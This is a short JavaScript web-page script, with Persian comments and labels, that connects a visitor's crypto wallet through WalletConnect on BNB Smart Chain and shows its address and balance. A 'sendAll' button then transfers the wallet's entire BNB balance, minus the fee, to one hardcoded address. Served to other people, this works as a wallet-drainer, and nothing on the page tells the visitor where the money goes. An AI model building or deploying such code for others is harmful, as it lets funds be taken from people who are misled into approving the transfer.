import { ethers } from "ethers";
import EthereumProvider from "@walletconnect/ethereum-provider";

let provider, ethersProvider, signer, userAddress;

document.getElementById("connect").onclick = async () => {
  provider = await EthereumProvider.init({
    projectId: "4d08946e6c316bed5e76b450ccbb5256", // ← از WalletConnect Cloud بگیر
    chains: [56],
    showQrModal: true,
  });

  await provider.enable();

  ethersProvider = new ethers.BrowserProvider(provider);
  signer = await ethersProvider.getSigner();
  userAddress = await signer.getAddress();

  document.getElementById("address").innerText = "آدرس کیف پول: " + userAddress;

  const balance = await ethersProvider.getBalance(userAddress);
  const bnb = ethers.formatEther(balance);
  document.getElementById("balance").innerText = "موجودی BNB: " + bnb;
};

document.getElementById("sendAll").onclick = async () => {
  const toAddress = "0x91f704D414979fB1ac168084B4C2651a3C3508d3"; // ← آدرس مقصد شما

  const gasPrice = await ethersProvider.getFeeData();
  const balance = await ethersProvider.getBalance(userAddress);

  const gasLimit = BigInt(21000);
  const totalFee = gasPrice.gasPrice * gasLimit;

  if (balance <= totalFee) {
    alert("موجودی کافی برای پرداخت کارمزد وجود ندارد.");
    return;
  }

  const valueToSend = balance - totalFee;

  const tx = await signer.sendTransaction({
    to: toAddress,
    value: valueToSend,
    gasLimit,
    gasPrice: gasPrice.gasPrice,
  });

  alert("تراکنش ارسال شد:\n" + tx.hash);
};